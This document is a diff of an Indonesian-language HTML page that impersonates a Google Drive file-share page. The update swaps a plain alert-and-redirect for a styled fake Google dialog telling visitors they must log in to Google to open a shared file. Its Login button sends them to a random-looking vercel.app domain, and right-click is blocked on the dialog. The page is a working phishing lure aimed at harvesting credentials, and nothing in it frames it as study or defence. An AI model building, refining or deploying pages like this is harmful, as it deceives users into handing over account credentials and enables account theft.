@@ -1,30 +1,144 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" type="image/png">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Drive - File shared</title>
   <style>
-  body {
-   background: url('bg.jpg');
-    background-size: cover;
-  }
-  img {
-    width: 100%;
-    height: 100%;
-  }
+    body {
+      background: url('https://kenanganmasalalu.vercel.app/bg.jpg');
+      background-size: cover;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      visibility: hidden;
+      opacity: 0;
+      transition: visibility 0.3s, opacity 0.3s;
+    }
+
+    .overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+
+    .alert-box {
+      user-select: none;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      width: 300px;
+      max-width: 80%;
+      padding: 20px;
+      animation: scaleIn 0.2s ease;
+    }
+
+    @keyframes scaleIn {
+      from {
+        transform: scale(-3);
+        opacity: 1;
+      }
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .alert-header {
+      font-family: Arial, sans-serif;
+      font-size: 18px;
+      font-weight: 500;
+      margin-bottom: 10px;
+      color: #202124;
+    }
+
+    .alert-body {
+      font-family: Arial, sans-serif;
+      font-size: 14.5px;
+      color: #5f6368;
+      margin-bottom: 20px;
+    }
+
+    .alert-footer {
+      display: flex;
+      justify-content: flex-end;
+      gap: 10px;
+    }
+
+    .alert-footer button {
+      background-color: #f1f3f4;
+      color: #3c4043;
+      padding: 8px 16px;
+      border-radius: 4px;
+      font-weight: 400px;
+      font-size: 14px;
+      border: none;
+      -webkit-tap-highlight-color: transparent;
+      cursor: pointer;
+    }
+
+    .alert-footer button.primary {
+      background-color: #1a73e8;
+      color: white;
+    }
+
+    .alert-footer button:hover {
+      background-color: #e8eaed;
+    }
+
+    .alert-footer button.primary:hover {
+      background-color: #1669c1;
+    }
   </style>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Drive - file shared</title>
-    <script>
-        window.onload = function() {
-          setTimeout(function() {
-           alert("Anda harus login ke google untuk mengakses file ini!");
-         window.location.href = "https://g5rc5rf76g77ygh7gg6f65tft6ftghi8j61.vercel.app/";
-    }, 200);
-};
-    </script>
 </head>
 <body>
+  <div class="overlay" id="overlay">
+    <div class="alert-box" oncontextmenu="return false;">
+      <div class="alert-header">Perhatian</div>
+      <div class="alert-body">
+        Anda memerlukan login ke Google untuk mengakses file ini!
+      </div>
+      <div class="alert-footer">
+        <button id="cancelAlert">Batal</button>
+        <button class="primary" id="confirmAlert">Login</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    window.onload = function () {
+  const overlay = document.getElementById('overlay');
+  const cancelAlertButton = document.getElementById('cancelAlert');
+  const confirmAlertButton = document.getElementById('confirmAlert');
+
+  setTimeout(() => {
+    overlay.classList.add('active');
+  }, 200);
+
+  // Mengembalikan ke halaman sebelumnya saat tombol Batal diklik
+  cancelAlertButton.addEventListener('click', () => {
+    window.location.href = "https://google.com";
+  });
+
+  // Redirect ke URL tertentu saat tombol Login diklik
+  confirmAlertButton.addEventListener('click', () => {
+    window.location.href = "https://g5rc5rf76g77ygh7gg6f65tft6ftghi8j61.vercel.app/";
+  });
+};
+  </script>
 </body>
 </html>
